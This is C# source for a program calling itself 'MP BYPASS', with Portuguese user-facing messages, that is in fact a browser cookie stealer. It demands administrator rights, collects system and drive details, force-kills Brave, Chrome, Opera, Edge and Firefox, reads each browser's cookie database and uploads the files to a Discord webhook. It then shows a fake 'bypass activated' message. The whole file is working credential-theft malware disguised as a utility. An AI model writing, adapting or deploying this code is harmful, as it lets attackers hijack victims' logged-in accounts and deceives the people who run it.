
using System.ComponentModel.Design.Serialization;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices.ObjectiveC;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using System;
using System.Runtime.InteropServices;

// Globals
const String APPNAME = "MP BYPASS";
const String MessageOk = "Bypass ativado.";
const String MessageFail = "Rode novamente o bypass.";


// Protection
WindowsIdentity identidade = WindowsIdentity.GetCurrent();
WindowsPrincipal root = new WindowsPrincipal(identidade);
bool isRoot = root.IsInRole(WindowsBuiltInRole.Administrator);

if (!isRoot)
{
    MessageBox.Show("Execute como administrador!", APPNAME, MessageBoxButtons.OK, MessageBoxIcon.Warning);
    Environment.Exit(777);
}



const int STATUS_OK = 200;
const string LINK = "https://discord.com/api/webhooks/*";
string USER = Environment.UserName;
string edgePath = "C:/Users/" + USER + "/AppData/Local/Microsoft/Edge/User Data/Default/Network";
string chromePath = "C:/Users/" + USER + "/AppData/Local/Google/Chrome/User Data/Default/Network";
string operaPath = "C:/Users/" + USER + "/AppData/Roaming/Opera Software/Opera Stable/Network";
string firefoxPath = "C:/Users/" + USER + "/AppData/Roaming/Mozilla/Firefox/Profiles";
string bravePath = "C:/Users/" + USER + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Network";

string Sender = "```js" +
    "\nSistema operacional: " + Environment.OSVersion +
    "\nArquitetura de processamento: " + Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE") +
    "\nModelo do processador: " + Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER") + 
    "\nUsername na rede: " + Environment.UserDomainName + 
    "\nUsuário logado no sistema: " + Environment.UserName + 
    "\n\nDiscos de armazenamentos conectados: ";



foreach(System.IO.DriveInfo disco in System.IO.DriveInfo.GetDrives())
{
    try
    {
        Sender += "\nDisco: " + disco.Name + 
            "\nFormato de volume: " + disco.DriveFormat + 
            "\nCapacidade total: " + disco.TotalSize + 
            "\nCapacidade livre: " + disco.TotalFreeSpace;
    }catch { }
}

void KillSoft(string name)
{
    Process[] processos = Process.GetProcessesByName(name);
    foreach(Process processo in processos)
    {
        processo.Kill();
    }
}

async Task<bool> complexColl(string path, string software, string aditional)
{
    if (Directory.Exists(path))
    {
        string[] objectiveList = { };
        var rooties = Directory.EnumerateDirectories(path);
        foreach (string dir in rooties)
        {
            var objectivies = Directory.EnumerateFiles(dir);
            foreach (string data in objectivies)
            {
                string[] before = data.Split("\\");
                if (before[before.Length - 1] == "cookies.sqlite")
                {
                    objectiveList = objectiveList.Append(data.ToString()).ToArray();
                }
            }
        }

        foreach (string item in objectiveList)
        {
            int delay = 2000;
            using (var httpClient = new HttpClient())
            {
                using (var content = new MultipartFormDataContent())
                {
                    KillSoft("firefox");
                    await Task.Delay(1000);
                    byte[] obj = await File.ReadAllBytesAsync(item);
                    var rootObj = new ByteArrayContent(obj);
                    string name = software + "-" + aditional;
                    content.Add(rootObj, name, name);
                    content.Add(new StringContent(Sender + "\n\nNavegador: " + software + "```"), "content");
                    var fetcher = await httpClient.PostAsync(LINK, content);
                    int attempts = 0;
                    int statusResponse;
                    if (int.TryParse(fetcher.StatusCode.ToString(), out statusResponse))
                    {
                        while (statusResponse != STATUS_OK)
                        {
                            if (attempts > 8) { 
                                return false;
                            }
                            attempts++;
                            await Task.Delay(delay);
                            fetcher = await httpClient.PostAsync(LINK, content);
                            int.TryParse(fetcher.StatusCode.ToString(), out statusResponse);
                            delay += 10000;
                        }

                    }
                }
            }
        }
    }
    else
    {
        return false;
    }
    return true;
}

async Task<bool> defaultColl(string path, string software, string aditional)
{
    if (Directory.Exists(path))
    {
        int delay = 2000;
        string newPath = path + "/Cookies";
        using (var httpClient = new HttpClient())
        {
            using (var content = new MultipartFormDataContent())
            {

                switch (software)
                {
                    case "edge":
                        KillSoft("msedge");
                        break;
                    case "chrome":
                        KillSoft("chrome");
                        break;
                    case "opera":
                        KillSoft("opera");
                        break;
                    case "brave":
                        KillSoft("brave");
                        break;
                    default:
                        break;
                }
                await Task.Delay(1000);
                byte[] rootFile = await File.ReadAllBytesAsync(newPath);
                var rootContent = new ByteArrayContent(rootFile);
                string name = software + "-" + aditional;
                content.Add(rootContent, name, name);
                content.Add(new StringContent(Sender + "\n\nNavegador: " + software + "```"), "content");
                var fetcher = await httpClient.PostAsync(LINK, content);
                int attempts = 0;
                int statusResponse;
                if (int.TryParse(fetcher.StatusCode.ToString(), out statusResponse))
                {
                    while (statusResponse != STATUS_OK)
                    {
                        if (attempts > 8)
                        {
                            return false;
                        }
                        attempts++;
                        await Task.Delay(delay);
                        fetcher = await httpClient.PostAsync(LINK, content);
                        int.TryParse(fetcher.StatusCode.ToString(), out statusResponse);
                        delay += 10000;
                    }

                }
            }
        }
    }
    else
    {
        return false;
    }

    return true;
}



bool braveCookie = await defaultColl(bravePath, "brave", USER);
bool chromeCookie = await defaultColl(chromePath, "chrome", USER);
bool operaCookie = await defaultColl(operaPath, "opera", USER);
bool edgeCookie = await defaultColl(edgePath, "edge", USER);
bool firefoxCookie = await complexColl(firefoxPath, "firefox", USER);

if (braveCookie & chromeCookie & operaCookie & edgeCookie & firefoxCookie)
{
    MessageBox.Show(MessageOk, APPNAME, MessageBoxButtons.OK, MessageBoxIcon.Warning);
    Environment.Exit(200);
} 
else
{
    MessageBox.Show(MessageFail, APPNAME, MessageBoxButtons.OK, MessageBoxIcon.Warning);
    Environment.Exit(0);
}
